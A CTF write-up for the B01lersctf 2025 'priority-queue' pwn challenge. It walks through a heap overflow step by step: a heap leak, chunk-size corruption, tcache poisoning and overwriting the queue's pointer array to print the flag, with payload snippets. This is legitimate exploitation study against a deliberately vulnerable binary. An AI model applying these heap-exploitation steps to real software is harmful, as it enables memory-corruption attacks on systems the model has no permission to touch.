---
title: "priority-queue writeup"
description: "Source first:"
event: "B01lersctf"
year: 2025
category: pwn
tags: ["pwn","heap"]
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "b01lersctf/pwn/priority_queue"
featured: false
flagsHidden: false
---

> Imported from [b01lersctf/pwn/priority_queue](https://github.com/R3izorr/CTF_writeup/tree/main/b01lersctf/pwn/priority_queue).

# priority-queue writeup

## Bug

Source first:

```c
void edit(void) {
    if (size == 0) {
        puts("Queue is empty!");
        return;
    }

    puts("Message: ");
    read(fileno(stdin), array[0], 32);

    move_down(0);
}
```

`insert()` allocates `strlen(input) + 1`.

For a 1-byte string, glibc gives a `0x20` heap chunk:

```text
prev_size  8
size       8
user      0x10
```

But `edit()` always writes `0x20` bytes into `array[0]`.

So editing a tiny message gives:

```text
0x10 bytes: overwrite current chunk user data
0x10 bytes: overwrite next chunk header
```

The priority queue is useful because `array[0]` is the smallest string by `strcmp`.
We can control which chunk is edited by choosing string values like `!`, `a`, `b`, `z`.

## Target

At startup, the program reads the flag into a heap chunk:

```c
char *flag = malloc(100);
fgets(flag, 100, file);
```

The pointer is not saved globally, but the flag chunk stays on the heap.

Goal: make `array[0]` point to that flag chunk, then call `peek()`.

## Main Idea

Use a small heap overflow to get:

1. heap leak from tcache metadata
2. chunk-size corruption
3. overlapping chunks
4. tcache poisoning into the queue pointer array
5. rewrite `array[0] = flag_addr`

This is classic Nightmare-style heap grooming/tcache poisoning.

Reference: <https://guyinatuxedo.github.io/> heap sections, especially tcache/fastbin-style pointer poisoning ideas.

## Heap Leak

Make three tiny chunks:

```text
A = "z"
B = "b"
C = "a"
```

Because this is a min-heap, deleting twice frees:

```text
delete -> C
delete -> B
```

Now tcache for size `0x20` contains:

```text
B -> C
```

The queue root is now `A`.

Edit `A` with 32 bytes:

```text
A user data      = "X" * 0x10
B chunk metadata = overwritten
B fd             still points to C
```

Then `peek()` prints `A` with `puts`.
Since no null byte was written in the first 32 bytes, `puts` overreads into B's freed tcache metadata and leaks `B->fd`, which is `C`.

From local heap layout:

```text
C        = leaked pointer
A        = C - 0x40
flag     = C - 0x100
array    = C - 0x90
target   = array - 0x10
```

`target = array - 0x10` is chosen because malloc returns `chunk_header + 0x10`.
If poisoned malloc returns `target`, then editing that fake chunk writes directly over `array`.

## Chunk Size Corruption

Restore B's chunk header after the leak damage.

Then allocate:

```text
B = "b"
C = "!"
E = "x"
```

Make `C` root and edit it to forge a valid-looking next chunk header:

```text
C user:
  "y" * 8
  p64(0x21)      fake next chunk size check for B
  p64(0)
  p64(0x21)      preserve E header
```

Then make `A` root and overflow from A into B's header:

```text
B.size = 0x31
```

Now glibc treats B as a `0x30` chunk.

Free order:

```text
delete B -> tcache[0x30]
delete E -> tcache[0x20]
delete C -> tcache[0x20]
```

Important reason for freeing E too:

After poisoning C's `fd`, tcache needs a nonzero count so malloc will return the poisoned target after popping C.

## Tcache Poison

Allocate B again with a `0x30`-sized request:

```python
insert(b"x" * 0x20 + p64(target)[:6])
```

This allocation overlaps into C and overwrites C's tcache `fd`:

```text
C.fd = array - 0x10
```

Then:

```text
insert("w") -> malloc returns C
insert("!") -> malloc returns array - 0x10
```

Now the chunk used by `"!"` is fake and points just before `array`.

## Rewrite Queue Array

The fake chunk is root because `"!"` is small.

Edit it:

```python
edit(
    b"z" * 16 +
    p64(flag_addr) +
    p64(a_addr)
)
```

Since fake chunk user pointer is `array - 0x10`, this writes:

```text
target + 0x00 = "z" * 16
target + 0x10 = array[0] = flag_addr
target + 0x18 = array[1] = A
```

`move_down(0)` runs after edit.
The fake chunk string is changed to `"z..."`, so the flag string (`bctf{...}` locally) becomes lexicographically smaller and stays at root.

Finally:

```text
peek -> puts(array[0]) -> prints flag
```

## Run

Local:

```bash
python3 solve.py
```

Remote:

```bash
python3 solve.py REMOTE
```

Local output:

```text
[+] bctf{fake_flag}
```

